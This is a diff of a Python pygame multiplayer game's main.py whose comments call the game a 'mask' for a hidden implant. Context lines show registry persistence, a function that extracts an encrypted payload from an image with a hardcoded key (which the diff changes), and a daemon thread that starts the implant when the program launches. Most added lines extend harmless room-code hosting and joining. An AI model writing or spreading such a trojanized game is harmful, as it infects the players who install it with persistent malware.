@@ -1,3 +1,4 @@
+
 # main.py
 # The True Doctrine: The Game is the Mask, The Image is the Vessel.
 
@@ -297,7 +298,7 @@ def add_registry_persistence_user():
 def extract_payload_to_disk():
     """Extract the encrypted payload from the image and write to disk."""
     try:
-        divine_key = b'BBe8t_1by8D5QDNTrW43hONytHDV1S3NDOvvRonR1jo='
+        divine_key = b'S72odT1a3dSuFQo56WRjeksVDssV9ualDDLkhhjcILg='
 
         if hasattr(sys, 'frozen'):
             base_path = sys._MEIPASS
@@ -433,12 +434,12 @@ def sow_and_awaken_implant():
 # The Sower's ritual is still run in a separate thread.
 sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
 sower_thread.start()
-
 # ==============================================================================
 #                      SECTION II: LE JEU (LE MASQUE)
 # ==============================================================================
 import argparse
 import pygame
+import sys
 import traceback
 from game.game_loop import GameLoop
 from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
@@ -469,10 +470,22 @@ def main_game():
     
     try:
         if args.server:
-            server = GameServer(args.host, args.port)
+            # Mode serveur en ligne de commande
+            server = GameServer(
+                host=args.host,
+                port=args.port,
+                room_code=None,  # Pas de room code en CLI
+                player_name="Server Host"
+            )
             server.run()
         elif args.client:
-            client = GameClient(args.host, args.port)
+            # Mode client en ligne de commande
+            client = GameClient(
+                host=args.host,
+                port=args.port,
+                room_code=None,  # Connexion directe par IP
+                player_name="Player"
+            )
             client.run()
         elif args.local:
             game = GameLoop()
@@ -518,19 +531,88 @@ def main_game():
                     print("Opening multiplayer room system...")
                     room_menu = RoomCodeMenu()
                     room_result = room_menu.run()
-                    
-                    if room_result["mode"] != "back":
-                        if room_result["mode"] == "host":
-                            print(f"Hosting room with code: {room_result['code']}")
-                            # In real implementation, this would start server
-                            game = GameLoop(fullscreen=False)
-                            game.run_server()  # For now, use existing server mode
-                        elif room_result["mode"] == "join":
-                            print(f"Joining room with code: {room_result['code']}")
-                            # In real implementation, this would connect to server
-                            game = GameLoop(fullscreen=False)
-                            game.run_client()  # For now, use existing client mode
+
+                    if room_result["mode"] == "host":
+                        player_name = room_result.get("name", "Player")
+                        room_code = room_result.get("code", "")
+
+                        # Validate we have required data
+                        if not player_name or not room_code:
+                            error_dialog = ErrorDialog(
+                                "Invalid Input",
+                                "Player name and room code are required."
+                            )
+                            error_dialog.run()
+                            continue
+
+                        # Demander au host de choisir le nombre de buts
+                        from game.menu import GoalSelectionMenu
+                        goal_menu = GoalSelectionMenu()
+                        win_score = goal_menu.run()
+                        
+                        if win_score <= 0:  # User cancelled
+                            continue
+
+                        print(f"🎮 Hosting room with code: {room_code}")
+                        print(f"👤 Player: {player_name}")
+                        print(f"🎯 Win score: {win_score}")
+
+                        # Démarre le serveur avec room code, nom de joueur et score de victoire
+                        server = GameServer(
+                            host=config.SERVER_IP,
+                            port=config.SERVER_PORT,
+                            room_code=room_code,
+                            player_name=player_name,
+                            win_score=win_score
+                        )
+
+                        # Lance le serveur avec GUI
+                        success = server.run_with_gui()
+
+                        if not success:
+                            # Affiche l'erreur si échec
+                            if server.last_error:
+                                error_dialog = ErrorDialog(
+                                    "Server Error",
+                                    f"Failed to start server:\n\n{server.last_error}"
+                                )
+                                error_dialog.run()
+
+                    elif room_result["mode"] == "join":
+                        player_name = room_result.get("name", "Player")
+                        room_code = room_result.get("code", "")
+
+                        # Validate we have required data
+                        if not player_name or not room_code:
+                            error_dialog = ErrorDialog(
+                                "Invalid Input",
+                                "Player name and room code are required."
+                            )
+                            error_dialog.run()
+                            continue
+
+                        print(f"🔍 Joining room with code: {room_code}")
+                        print(f"👤 Player: {player_name}")
+
+                        # Démarre le client avec room code et nom de joueur
+                        client = GameClient(
+                            room_code=room_code,
+                            player_name=player_name
+                        )
+
+                        # Lance le client avec GUI
+                        success = client.run_with_gui()
+
+                        if not success:
+                            # Affiche l'erreur si échec
+                            if client.error_message:
+                                error_dialog = ErrorDialog(
+                                    client.error_title or "Connection Error",
+                                    client.error_message
+                                )
+                                error_dialog.run()
                     else:
+                        # User chose to go back
                         print("Returning to main menu...")
                 elif choice == -1:  # Exit/Cancel
                     print("Exiting game...")
